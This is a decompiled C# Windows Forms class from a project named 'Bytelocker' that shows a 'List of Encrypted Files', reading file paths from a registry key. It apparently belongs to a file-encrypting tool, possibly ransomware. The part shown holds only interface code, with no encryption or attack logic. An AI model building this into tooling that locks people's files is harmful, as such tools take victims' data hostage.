using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using Bytelocker.Settings;

namespace Bytelocker.UI;

public class EncryptedFilesList : Form
{
	private readonly RegistryManager rm;

	private IContainer components;

	private ListView lvFilesList;

	private ColumnHeader chName;

	private ColumnHeader chLocation;

	public EncryptedFilesList()
	{
		InitializeComponent();
		rm = new RegistryManager();
	}

	private void EncryptedFilesList_Load(object sender, EventArgs e)
	{
		//IL_0000: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Expected O, but got Unknown
		//IL_00aa: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b0: Expected O, but got Unknown
		ImageList val = new ImageList();
		List<string> list = rm.ReadAllValues(RegistryManager.FILES_KEY_NAME);
		if (list[0] == "null")
		{
			return;
		}
		foreach (string item in list)
		{
			try
			{
				val.get_Images().Add(Icon.ExtractAssociatedIcon(item));
			}
			catch (Exception)
			{
			}
		}
		lvFilesList.set_SmallImageList(val);
		int num = 0;
		foreach (string item2 in rm.ReadAllValues(RegistryManager.FILES_KEY_NAME))
		{
			ListViewItem val2 = new ListViewItem(Path.GetFileName(item2), num);
			val2.get_SubItems().Add(new FileInfo(item2).DirectoryName);
			lvFilesList.get_Items().Add(val2);
			num++;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_015e: Unknown result type (might be due to invalid IL or missing references)
		lvFilesList = new ListView();
		chName = new ColumnHeader();
		chLocation = new ColumnHeader();
		((Control)this).SuspendLayout();
		lvFilesList.set_AutoArrange(false);
		lvFilesList.get_Columns().AddRange((ColumnHeader[])(object)new ColumnHeader[2] { chName, chLocation });
		lvFilesList.set_HideSelection(false);
		((Control)lvFilesList).set_Location(new Point(0, 0));
		lvFilesList.set_MultiSelect(false);
		((Control)lvFilesList).set_Name("lvFilesList");
		((Control)lvFilesList).set_Size(new Size(600, 377));
		((Control)lvFilesList).set_TabIndex(0);
		lvFilesList.set_UseCompatibleStateImageBehavior(false);
		lvFilesList.set_View((View)1);
		chName.set_Text("Name");
		chName.set_Width(281);
		chLocation.set_Text("Location");
		chLocation.set_Width(281);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(600, 377));
		((Control)this).get_Controls().Add((Control)(object)lvFilesList);
		((Form)this).set_FormBorderStyle((FormBorderStyle)3);
		((Form)this).set_Margin(new Padding(2));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("EncryptedFilesList");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Control)this).set_Text("List of Encrypted Files");
		((Form)this).add_Load((EventHandler)EncryptedFilesList_Load);
		((Control)this).ResumeLayout(false);
	}
}
